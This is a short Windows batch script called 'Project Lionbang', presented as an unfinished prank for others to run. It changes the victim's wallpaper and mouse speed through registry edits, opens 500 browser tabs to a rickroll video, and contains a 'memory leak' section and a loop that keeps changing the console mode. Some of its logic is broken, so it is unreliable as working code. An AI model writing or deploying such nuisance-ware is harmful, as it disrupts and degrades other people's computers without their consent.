@echo off
title Project Lionbang
echo lol this is unfinished but you can try it
pause
REM Setting the desktop background
reg add "HKCU\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cd/Green_and_Black%27s_dark_chocolate_bar_2.jpg/280px-Green_and_Black%27s_dark_chocolate_bar_2.jpg" /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters

REM Adding 500 rickrolls
for /L %%i in (1,1,500) do (
    start "Rickroll" "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
)

REM Setting a fast cursor
reg add "HKCU\Control Panel\Mouse" /v "MouseSpeed" /t REG_SZ /d "20" /f

REM Memory leaks
:leak
set "leak=!leak! "

REM Resolution Fucker
:resolution
for /L %%i in (1,1,9999) do (
    mode %%i
    timeout 1 > nul
)
